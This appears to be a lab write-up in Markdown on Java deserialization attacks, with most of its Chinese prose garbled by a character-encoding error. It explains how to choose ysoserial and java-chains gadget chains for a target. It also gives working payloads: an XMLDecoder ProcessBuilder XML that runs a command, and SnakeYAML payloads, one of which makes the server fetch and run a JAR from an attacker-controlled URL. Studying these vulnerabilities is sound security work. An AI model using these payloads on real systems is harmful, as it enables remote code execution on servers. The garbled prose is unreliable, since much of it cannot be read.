> ç¡®è®¤æ¼æ´å­˜åœ¨åï¼Œæ ¹æ®æ”¶é›†åˆ°çš„ä¾èµ–åº“ä¿¡æ¯ï¼Œé€‰æ‹©å¯¹åº”çš„é“¾ï¼š
>
> - **è‹¥å­˜åœ¨ Apache Commons Collectionsï¼ˆ3.xï¼‰**ï¼šä¼˜å…ˆå°è¯•`CommonsCollections1`ï¼ˆæœ€ç»å…¸ï¼Œå…¼å®¹æ€§å¹¿ï¼‰ï¼›è‹¥å¤±è´¥ï¼Œä¾æ¬¡æµ‹è¯•`CommonsCollections2-7`ï¼ˆé’ˆå¯¹ä¸åŒè°ƒç”¨è·¯å¾„ï¼‰ã€‚
> - **è‹¥å­˜åœ¨ ROME åº“**ï¼šä½¿ç”¨`ROME`é“¾ï¼ˆä¾èµ–`rome-1.0.jar`ä¸­çš„`ObjectBean`ç±»ï¼‰ã€‚
> - **è‹¥å­˜åœ¨ Jackson åº“ï¼ˆä½ç‰ˆæœ¬ï¼‰**ï¼šä½¿ç”¨`Jackson`é“¾ï¼ˆåˆ©ç”¨`@JsonTypeInfo`ååºåˆ—åŒ–ä»»æ„ç±»ï¼‰ã€‚
> - **è‹¥ä¸º WebLogic æœåŠ¡å™¨**ï¼šå°è¯•`wls9_async`ã€`wls10`ç­‰ä¸“å±é“¾ï¼ˆä¾èµ– WebLogic çš„`weblogic.jms.common.StreamMessageImpl`ç­‰ç±»ï¼‰ã€‚
>
> #### 3. æ’é™¤æ³•ï¼šä» â€œé«˜å…¼å®¹æ€§â€ åˆ° â€œä¸“å±é“¾â€
>
> è‹¥ç¯å¢ƒä¿¡æ¯ä¸æ˜ç¡®ï¼Œå¯æŒ‰ä»¥ä¸‹é¡ºåºæµ‹è¯•ï¼ˆå…¼å®¹æ€§ä»é«˜åˆ°ä½ï¼‰ï¼š
>
> 1. **JDK å†…ç½®ç±»é“¾**ï¼šå¦‚`URLDNS`ï¼ˆæ¢æµ‹ç”¨ï¼‰ã€`Jdk7u21`ï¼ˆä¾èµ– JDK 7u21 åŠä»¥ä¸‹çš„`sun.rmi.server.UnicastRef`ç±»ï¼‰ã€‚
> 2. **é«˜æµè¡Œåº¦åº“é“¾**ï¼šå¦‚`CommonsCollections1`ï¼ˆApache Commons Collections åº”ç”¨æå¹¿ï¼‰ã€`Log4j`ï¼ˆè‹¥å­˜åœ¨ç‰¹å®šç‰ˆæœ¬ï¼‰ã€‚
> 3. **åº”ç”¨æœåŠ¡å™¨ä¸“å±é“¾**ï¼šå¦‚ WebLogicã€JBossã€Jenkins ç­‰å„è‡ªçš„é“¾ã€‚
> 4. **å°ä¼—åº“é“¾**ï¼šå¦‚`C3P0`ã€`JBossInterceptors`ç­‰ï¼ˆä»…å½“ç¡®è®¤ç›®æ ‡å­˜åœ¨å¯¹åº”åº“æ—¶å°è¯•ï¼‰ã€‚
>
> ### ä¸‰ã€å…¸å‹åœºæ™¯ç¤ºä¾‹
>
> - **åœºæ™¯ 1**ï¼šç›®æ ‡é”™è¯¯é¡µæ˜¾ç¤º`org.apache.commons.collections.map.LazyMap` â†’ å­˜åœ¨ Commons Collections 3.x â†’ ä¼˜å…ˆç”¨`CommonsCollections1`ã€‚
> - **åœºæ™¯ 2**ï¼šç›®æ ‡æ˜¯ WebLogic 10.3.6 â†’ å°è¯•`wls9_async`é“¾ï¼ˆWebLogic ä¸“å±ï¼Œæ— éœ€ç¬¬ä¸‰æ–¹åº“ï¼‰ã€‚
> - **åœºæ™¯ 3**ï¼šç›®æ ‡ Java ç‰ˆæœ¬ä¸º 8u200+ â†’ é¿å¼€`CommonsCollections1`ï¼ˆå¯èƒ½å› åå°„é™åˆ¶å¤±æ•ˆï¼‰ï¼Œå°è¯•`Groovy`é“¾ï¼ˆè‹¥å­˜åœ¨ Groovy åº“ï¼‰ã€‚
>
> ### æ€»ç»“
>
> æ ¸å¿ƒé€»è¾‘ï¼š**â€œç¯å¢ƒå†³å®šé“¾â€**ã€‚å…ˆé€šè¿‡å„ç§æ–¹å¼æ”¶é›†ç›®æ ‡çš„ä¾èµ–åº“ã€ç‰ˆæœ¬ã€åº”ç”¨ç±»å‹ç­‰ä¿¡æ¯ï¼Œå†å¯¹ç…§å·¥å…·ä¸­é“¾çš„ â€œä¾èµ–æ¡ä»¶â€ï¼ˆå¯æŸ¥çœ‹ ysoserial æºç ä¸­å„é“¾çš„å®ç°ï¼Œäº†è§£å…¶ä¾èµ–çš„ç±»ï¼‰ï¼Œæœ€ç»ˆåŒ¹é…å‡ºå¯èƒ½æœ‰æ•ˆçš„é“¾ã€‚è‹¥ä¿¡æ¯ä¸è¶³ï¼Œä»é«˜å…¼å®¹æ€§é“¾å¼€å§‹é€æ­¥æµ‹è¯•ï¼Œç»“åˆæ‰§è¡Œç»“æœï¼ˆå¦‚å‘½ä»¤å›æ˜¾ã€æ–‡ä»¶å†™å…¥ã€DNSlogï¼‰éªŒè¯æœ‰æ•ˆæ€§ã€‚

-https://github.com/frohoff/ysoserial    ç»å…¸å·¥å…·

-https://github.com/vulhub/java-chains   æœ¬æ¬¡ä½¿ç”¨

#### Java-chains

https://github.com/vulhub/java-chains 

éƒ¨ç½²æŒ‰ç…§æ•™ç¨‹éƒ¨ç½²

ä½¿ç”¨

![image-20250817232105941](./images/Javaååºåˆ—åŒ–/image-20250817232105941.png)

å°†ç”Ÿæˆçš„payloadå¤åˆ¶åˆ°é¶åœºä¸­ï¼Œä¹Ÿå¯ä»¥å¼¹å‡ºè®¡ç®—å™¨

### xmldecoder

åœ¨é¶åœºä¸­ç›´æ¥è¾“å…¥æ‰§è¡Œçš„å‘½ä»¤å°±å¯ä»¥æ‰§è¡Œäº†

![image-20250818203553496](./images/Javaååºåˆ—åŒ–/image-20250818203553496.png)

åŸç†å‰–æ

> ### ä¸€ã€ä»£ç å¯¹æ•°æ®åŒ…çš„å¤„ç†æµç¨‹
>
> å½“æµè§ˆå™¨å‘é€`GET /home/deserialize/xmldecoder?cmd=calc HTTP/1.1`è¯·æ±‚åï¼Œä»£ç çš„æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š
>
> 1. **æ¥æ”¶ç”¨æˆ·è¾“å…¥**ï¼š
>    æ§åˆ¶å™¨æ–¹æ³•`xmlDecoder`é€šè¿‡`String cmd`å‚æ•°è·å– URL ä¸­`cmd=calc`çš„å€¼ï¼ˆå³ç”¨æˆ·è¾“å…¥çš„`calc`ï¼‰ã€‚
>
> 2. **æ„å»ºæ¶æ„ XML**ï¼š
>    ä»£ç å°†`cmd`æŒ‰ç©ºæ ¼åˆ†å‰²ä¸ºå­—ç¬¦ä¸²æ•°ç»„ï¼ˆè¿™é‡Œ`cmd=calc`åˆ†å‰²åä¸º`["calc"]`ï¼‰ï¼Œç„¶ååŠ¨æ€æ‹¼æ¥æˆä¸€ä¸ª XML æ–‡æ¡£ï¼š
>
>    ```xml
>    <?xml version="1.0" encoding="UTF-8"?>
>    <java version="1.8.0_151" class="java.beans.XMLDecoder">
>        <object class="java.lang.ProcessBuilder">
>            <array class="java.lang.String" length="1">
>                <void index="0">
>                    <string>calc</string>
>                </void>
>            </array>
>            <void method="start" />
>        </object>
>    </java>
>    ```
>
>    è¿™ä¸ª XML çš„å«ä¹‰æ˜¯ï¼šåˆ›å»ºä¸€ä¸ª`ProcessBuilder`å¯¹è±¡ï¼Œä¼ å…¥å‚æ•°`["calc"]`ï¼Œå¹¶è°ƒç”¨å…¶`start()`æ–¹æ³•ï¼ˆç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼‰ã€‚
>
> 3. **XML ååºåˆ—åŒ–æ‰§è¡Œ**ï¼š
>    ä»£ç ä½¿ç”¨`java.beans.XMLDecoder`è§£æä¸Šè¿° XMLï¼š
>
>    - é€šè¿‡`ByteArrayInputStream`å°† XML å­—ç¬¦ä¸²è½¬ä¸ºè¾“å…¥æµï¼›
>    - è°ƒç”¨`xmlDecoder.readObject()`æ–¹æ³•ï¼Œè§¦å‘ XML ååºåˆ—åŒ–è¿‡ç¨‹ï¼›
>    - `XMLDecoder`ä¼šæŒ‰ç…§ XML å®šä¹‰ï¼Œå®ä¾‹åŒ–`ProcessBuilder`å¯¹è±¡å¹¶æ‰§è¡Œ`start()`æ–¹æ³•ï¼Œæœ€ç»ˆåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œ`calc`å‘½ä»¤ï¼ˆæ‰“å¼€è®¡ç®—å™¨ï¼‰ã€‚
>
> 4. **è¿”å›ç»“æœ**ï¼š
>    æ— è®ºæˆåŠŸæˆ–å¤±è´¥ï¼Œéƒ½ä¼šå°†ç»“æœï¼ˆå¦‚ â€œæ‰§è¡ŒæˆåŠŸâ€ æˆ–å¼‚å¸¸ä¿¡æ¯ï¼‰é€šè¿‡`model`ä¼ é€’åˆ°å‰ç«¯é¡µé¢å±•ç¤ºã€‚

### SnakeYaml

#### åŸç†

> SnakeYAML æ˜¯ Java ä¸­å¸¸ç”¨çš„ YAML æ ¼å¼è§£æåº“ï¼Œå…¶ååºåˆ—åŒ–åŠŸèƒ½ç”¨äºå°† YAML æ–‡æ¡£è½¬æ¢ä¸º Java å¯¹è±¡ã€‚ä½†åœ¨é»˜è®¤é…ç½®ä¸‹ï¼ŒSnakeYAML çš„ååºåˆ—åŒ–å­˜åœ¨å®‰å…¨é£é™©ï¼Œå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…¶æ ¸å¿ƒåŸç†å¯åˆ†ä¸º**æ­£å¸¸è§£ææµç¨‹**å’Œ**å®‰å…¨é£é™©æˆå› **ä¸¤éƒ¨åˆ†ï¼š
>
> ### ä¸€ã€SnakeYAML ååºåˆ—åŒ–çš„æ­£å¸¸æµç¨‹
>
> SnakeYAML çš„ååºåˆ—åŒ–æœ¬è´¨æ˜¯ â€œæ ¹æ® YAML æ–‡æ¡£çš„æè¿°ï¼Œå®ä¾‹åŒ–å¹¶ç»„è£… Java å¯¹è±¡â€ï¼Œæ ¸å¿ƒæ­¥éª¤å¦‚ä¸‹ï¼š
>
> 1. **è§£æ YAML æ–‡æ¡£**
>    å½“è°ƒç”¨`Yaml.load()`ï¼ˆæˆ–`loadAs()`ç­‰æ–¹æ³•ï¼‰æ—¶ï¼ŒSnakeYAML é¦–å…ˆä¼šè§£æè¾“å…¥çš„ YAML å­—ç¬¦ä¸²ï¼Œè¯†åˆ«å…¶ä¸­çš„**æ•°æ®ç»“æ„**ï¼ˆå¦‚æ˜ å°„ã€åˆ—è¡¨ã€æ ‡é‡ï¼‰å’Œ**ç±»å‹æ ‡ç­¾**ï¼ˆç”¨äºæŒ‡å®š Java ç±»ï¼‰ã€‚
>    YAML ä¸­é€šè¿‡`!!`æ ‡ç­¾æŒ‡å®šè¦å®ä¾‹åŒ–çš„ Java ç±»ï¼Œä¾‹å¦‚ï¼š
>
>    ```yaml
>    !!java.util.HashMap
>    key: value
>    ```
>
>    è¡¨ç¤º â€œååºåˆ—åŒ–ä¸ºä¸€ä¸ª`java.util.HashMap`å¯¹è±¡ï¼Œå…¶é”®å€¼å¯¹ä¸º`key: value`â€ã€‚
>
> 2. **é€šè¿‡ Constructor åˆ›å»ºå¯¹è±¡**
>    SnakeYAML çš„`Constructor`ç±»æ˜¯ååºåˆ—åŒ–çš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£å°†è§£æåçš„ YAML èŠ‚ç‚¹è½¬æ¢ä¸º Java å¯¹è±¡ï¼š
>
>    - å¯¹äºåŸºæœ¬ç±»å‹ï¼ˆå¦‚å­—ç¬¦ä¸²ã€æ•°å­—ï¼‰æˆ–ç®€å•é›†åˆï¼ˆå¦‚`List`ã€`Map`ï¼‰ï¼Œ`Constructor`ä¼šç›´æ¥åˆ›å»ºå¯¹åº”å®ä¾‹å¹¶èµ‹å€¼ï¼›
>    - å¯¹äºè‡ªå®šä¹‰ç±»æˆ–å¤æ‚ç±»å‹ï¼ŒConstructorä¼šï¼š
>      1. æ ¹æ® YAML ä¸­çš„ç±»åï¼ˆå¦‚`!!com.example.User`ï¼‰é€šè¿‡åå°„æ‰¾åˆ°å¯¹åº”çš„ Java ç±»ï¼›
>      2. è°ƒç”¨è¯¥ç±»çš„æ„é€ æ–¹æ³•ï¼ˆé»˜è®¤ä¼˜å…ˆæ— å‚æ„é€ ï¼Œä¹Ÿæ”¯æŒæœ‰å‚æ„é€ ï¼‰å®ä¾‹åŒ–å¯¹è±¡ï¼›
>      3. è§£æ YAML ä¸­çš„å±æ€§ï¼ˆå¦‚`name: "test"`ï¼‰ï¼Œé€šè¿‡åå°„è®¾ç½®å¯¹è±¡çš„å­—æ®µå€¼ï¼ˆæˆ–è°ƒç”¨ setter æ–¹æ³•ï¼‰ã€‚
>
> 3. **ç»„è£…å¯¹è±¡å¹¶è¿”å›**
>    è‹¥ YAML ä¸­åŒ…å«åµŒå¥—ç»“æ„ï¼ˆå¦‚å¯¹è±¡ä¸­åŒ…å«å¦ä¸€ä¸ªå¯¹è±¡ï¼‰ï¼Œ`Constructor`ä¼šé€’å½’æ‰§è¡Œä¸Šè¿°æ­¥éª¤ï¼Œæœ€ç»ˆç»„è£…å‡ºå®Œæ•´çš„å¯¹è±¡æ ‘å¹¶è¿”å›ã€‚
>
> ### äºŒã€å®‰å…¨é£é™©ï¼šé»˜è®¤é…ç½®ä¸‹çš„ååºåˆ—åŒ–æ¼æ´æˆå› 
>
> SnakeYAML çš„é£é™©æ ¸å¿ƒåœ¨äº**é»˜è®¤ Constructor å…è®¸å®ä¾‹åŒ–ä»»æ„ Java ç±»**ï¼Œä¸”åœ¨å¯¹è±¡å®ä¾‹åŒ– / å±æ€§èµ‹å€¼è¿‡ç¨‹ä¸­å¯èƒ½è§¦å‘å±é™©æ–¹æ³•ï¼Œå¯¼è‡´æ”»å‡»è€…å¯æ„é€ æ¶æ„ YAML æ‰§è¡Œä»£ç ã€‚å…·ä½“åŸå› å¦‚ä¸‹ï¼š
>
> 1. **æ— é™åˆ¶çš„ç±»å®ä¾‹åŒ–**
>    é»˜è®¤æƒ…å†µä¸‹ï¼Œ`Yaml`å¯¹è±¡ä½¿ç”¨`DefaultConstructor`ï¼Œè¯¥æ„é€ å™¨ä¸é™åˆ¶å¯å®ä¾‹åŒ–çš„ç±» â€”â€” åªè¦ YAML ä¸­æŒ‡å®šäº†å…¨ç±»åï¼ˆå¦‚`!!java.lang.Runtime`ï¼‰ï¼ŒSnakeYAML å°±ä¼šå°è¯•é€šè¿‡åå°„åˆ›å»ºè¯¥ç±»çš„å®ä¾‹ã€‚
>
>    è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥åœ¨ YAML ä¸­æŒ‡å®š**å…·æœ‰å±é™©è¡Œä¸ºçš„ç±»**ï¼ˆå¦‚`java.lang.ProcessBuilder`ã€`java.lang.Runtime`ç­‰å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç±»ï¼‰ã€‚
>
> 2. **æ–¹æ³•è°ƒç”¨ä¸å±æ€§èµ‹å€¼çš„å‰¯ä½œç”¨**
>    éƒ¨åˆ†ç±»åœ¨**å®ä¾‹åŒ–**æˆ–**å±æ€§è®¾ç½®**è¿‡ç¨‹ä¸­ä¼šè§¦å‘å±é™©æ“ä½œï¼š
>
>    - ä¾‹å¦‚ï¼Œ`ProcessBuilder`çš„`start()`æ–¹æ³•å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè‹¥æ”»å‡»è€…åœ¨ YAML ä¸­æ„é€ `ProcessBuilder`å¹¶è§¦å‘å…¶`start()`è°ƒç”¨ï¼Œå³å¯åœ¨æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ï¼›
>    - æŸäº›ç±»çš„ setter æ–¹æ³•æˆ–æ„é€ æ–¹æ³•æœ¬èº«åŒ…å«å±é™©é€»è¾‘ï¼ˆå¦‚æ–‡ä»¶æ“ä½œã€ç½‘ç»œè¿æ¥ï¼‰ï¼Œååºåˆ—åŒ–æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚
>
> 3. **æ¶æ„ YAML payload ç¤ºä¾‹**
>    ä¸€ä¸ªå…¸å‹çš„æ¶æ„ YAML payload å¦‚ä¸‹ï¼Œç”¨äºæ‰§è¡Œ`calc`å‘½ä»¤ï¼ˆæ‰“å¼€è®¡ç®—å™¨ï¼‰ï¼š
>
>    > !!java.lang.ProcessBuilder [["calc"]]
>
>    è§£æè¿‡ç¨‹ï¼š
>
>    - `!!java.lang.ProcessBuilder`æŒ‡å®šå®ä¾‹åŒ–`ProcessBuilder`ç±»ï¼›
>    - `[["calc"]]`è¡¨ç¤ºè°ƒç”¨`ProcessBuilder`çš„æœ‰å‚æ„é€ æ–¹æ³•ï¼ˆå‚æ•°ä¸ºå­—ç¬¦ä¸²æ•°ç»„`["calc"]`ï¼‰ï¼›
>    - è™½ç„¶æœªæ˜¾å¼è°ƒç”¨`start()`ï¼Œä½†éƒ¨åˆ†ç‰ˆæœ¬çš„ SnakeYAML åœ¨è§£ææ—¶ä¼šéšå¼è§¦å‘æˆ–é€šè¿‡å…¶ä»–æ–¹å¼é—´æ¥è°ƒç”¨ï¼ˆå®é™…æ”»å‡»ä¸­å¯èƒ½éœ€è¦æ›´å¤æ‚çš„é“¾å¼è°ƒç”¨ï¼‰ã€‚
>
> ### ä¸‰ã€æ€»ç»“
>
> SnakeYAML ååºåˆ—åŒ–çš„æ ¸å¿ƒåŸç†æ˜¯ â€œåŸºäº YAML æ ‡ç­¾å’Œæ•°æ®ï¼Œé€šè¿‡åå°„åŠ¨æ€åˆ›å»ºå¹¶ç»„è£… Java å¯¹è±¡â€ã€‚å…¶å®‰å…¨é£é™©æºäº**é»˜è®¤é…ç½®ä¸‹å¯¹å¯å®ä¾‹åŒ–ç±»æ— é™åˆ¶**ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„ YAMLï¼Œè®© SnakeYAML å®ä¾‹åŒ–å±é™©ç±»å¹¶è§¦å‘å…¶æ–¹æ³•ï¼Œæœ€ç»ˆæ‰§è¡Œæ¶æ„ä»£ç ã€‚
>
> å®‰å…¨ä½¿ç”¨æ–¹å¼ï¼šé€šè¿‡è‡ªå®šä¹‰`Constructor`é™åˆ¶å¯ååºåˆ—åŒ–çš„ç±»ï¼ˆç™½åå•æœºåˆ¶ï¼‰ï¼Œç¦æ­¢å®ä¾‹åŒ–`ProcessBuilder`ã€`Runtime`ç­‰å±é™©ç±»ã€‚

![image-20250818214718656](./images/Javaååºåˆ—åŒ–/image-20250818214718656.png)

å¯¹äºé¶åœºä¸­å½“æäº¤payloadå

#### æµç¨‹

> ### ä¸€ã€åç«¯ä»£ç çš„å¤„ç†é€»è¾‘
>
> åç«¯ä»£ç æ˜¯ä¸€ä¸ª Spring æ§åˆ¶å™¨ï¼Œæ ¸å¿ƒé€»è¾‘å¦‚ä¸‹ï¼š
>
> 1. æ¥æ”¶å‰ç«¯ä¼ å…¥çš„`content`å‚æ•°ï¼ˆå³ç”¨æˆ·å¯æ§çš„ YAML å­—ç¬¦ä¸²ï¼‰ï¼›
> 2. ä½¿ç”¨ SnakeYAML çš„`Yaml`ç±»ï¼ˆé»˜è®¤é…ç½®ï¼‰è°ƒç”¨`load(content)`æ–¹æ³•ï¼Œå¯¹ YAML å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼›
> 3. ååºåˆ—åŒ–è¿‡ç¨‹ä¼šæ ¹æ® YAML ä¸­çš„å®šä¹‰å®ä¾‹åŒ– Java å¯¹è±¡ï¼Œå¹¶è¿”å›ç»“æœã€‚
>
> **å…³é”®é£é™©ç‚¹**ï¼šä»£ç ä½¿ç”¨äº†`new Yaml()`çš„é»˜è®¤æ„é€ ï¼Œæ­¤æ—¶ SnakeYAML ä¼šä½¿ç”¨`DefaultConstructor`â€”â€” è¯¥æ„é€ å™¨**ä¸é™åˆ¶å¯å®ä¾‹åŒ–çš„ç±»**ï¼Œå…è®¸æ”»å‡»è€…æŒ‡å®šä»»æ„ Java ç±»è¿›è¡Œååºåˆ—åŒ–ã€‚
>
> ### äºŒã€Payload çš„ç»“æ„ä¸æ‰§è¡Œæµç¨‹
>
> ä¼ å…¥çš„ YAML payload ä¸ºï¼š
>
> ```yaml
> !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:8000/upload/yaml-payload.jar']]]]
> ```
>
> å…¶æœ¬è´¨æ˜¯é€šè¿‡ SnakeYAML çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Œä¾æ¬¡å®ä¾‹åŒ–ä¸‰ä¸ªå…³é”®ç±»ï¼Œå½¢æˆæ”»å‡»é“¾ï¼š`URL` â†’ `URLClassLoader` â†’ `ScriptEngineManager`ï¼Œæœ€ç»ˆè§¦å‘æ¶æ„ä»£ç æ‰§è¡Œã€‚å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š
>
> #### 1. å®ä¾‹åŒ–`java.net.URL`å¯¹è±¡
>
> - YAML ä¸­`!!java.net.URL ['http://127.0.0.1:8000/upload/yaml-payload.jar']`è¡¨ç¤ºï¼š
>   ååºåˆ—åŒ–ä¸€ä¸ª`URL`å¯¹è±¡ï¼ŒæŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„æ¶æ„ JAR åŒ…åœ°å€ï¼ˆ`http://127.0.0.1:8000/upload/yaml-payload.jar`ï¼‰ã€‚
>
> #### 2. å®ä¾‹åŒ–`java.net.URLClassLoader`å¯¹è±¡
>
> - YAML ä¸­`!!java.net.URLClassLoader [[...]]`è¡¨ç¤ºï¼š
>   ååºåˆ—åŒ–ä¸€ä¸ª`URLClassLoader`ï¼ˆç±»åŠ è½½å™¨ï¼‰ï¼Œå…¶æ„é€ å‚æ•°æ˜¯ä¸Šä¸€æ­¥åˆ›å»ºçš„`URL`æ•°ç»„ï¼ˆå³æ¶æ„ JAR çš„åœ°å€ï¼‰ã€‚
>
>   `URLClassLoader`çš„ä½œç”¨æ˜¯**ä»æŒ‡å®šçš„ URLï¼ˆè¿œç¨‹æˆ–æœ¬åœ°ï¼‰åŠ è½½ç±»æ–‡ä»¶**ã€‚è¿™é‡Œé…ç½®åï¼Œè¯¥ç±»åŠ è½½å™¨ä¼šä»`yaml-payload.jar`ä¸­åŠ è½½ç±»ã€‚
>
> #### 3. å®ä¾‹åŒ–`javax.script.ScriptEngineManager`å¯¹è±¡
>
> - YAML ä¸­`!!javax.script.ScriptEngineManager [...]`è¡¨ç¤ºï¼š
>   ååºåˆ—åŒ–ä¸€ä¸ª`ScriptEngineManager`ï¼ˆè„šæœ¬å¼•æ“ç®¡ç†å™¨ï¼‰ï¼Œå…¶æ„é€ å‚æ•°æ˜¯ä¸Šä¸€æ­¥åˆ›å»ºçš„`URLClassLoader`ã€‚
>
>   `ScriptEngineManager`çš„æ ¸å¿ƒç‰¹æ€§æ˜¯ï¼š**åœ¨åˆå§‹åŒ–æ—¶ä¼šè‡ªåŠ¨æ‰«æå¹¶åŠ è½½å¯ç”¨çš„è„šæœ¬å¼•æ“**ï¼ˆé€šè¿‡`ServiceLoader`æœºåˆ¶ï¼‰ã€‚å…·ä½“æ¥è¯´ï¼š
>
>   - å®ƒä¼šä½¿ç”¨ä¼ å…¥çš„`URLClassLoader`å»åŠ è½½`yaml-payload.jar`ä¸­çš„ç±»ï¼›
>   - è‹¥è¯¥ JAR åŒ…ä¸­åŒ…å«ç¬¦åˆ â€œè„šæœ¬å¼•æ“è§„èŒƒâ€ çš„æ¶æ„ç±»ï¼ˆä¾‹å¦‚ï¼Œåœ¨`META-INF/services/javax.script.ScriptEngineFactory`æ–‡ä»¶ä¸­å£°æ˜çš„ç±»ï¼‰ï¼Œ`ScriptEngineManager`ä¼šé€šè¿‡`URLClassLoader`åŠ è½½å¹¶å®ä¾‹åŒ–è¿™äº›æ¶æ„ç±»ï¼›
>   - æ¶æ„ç±»çš„æ„é€ æ–¹æ³•æˆ–åˆå§‹åŒ–é€»è¾‘ä¸­å¯ä»¥åŒ…å«ä»»æ„ä»£ç ï¼ˆå¦‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€åå¼¹ shell ç­‰ï¼‰ï¼Œæ­¤æ—¶ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œã€‚

















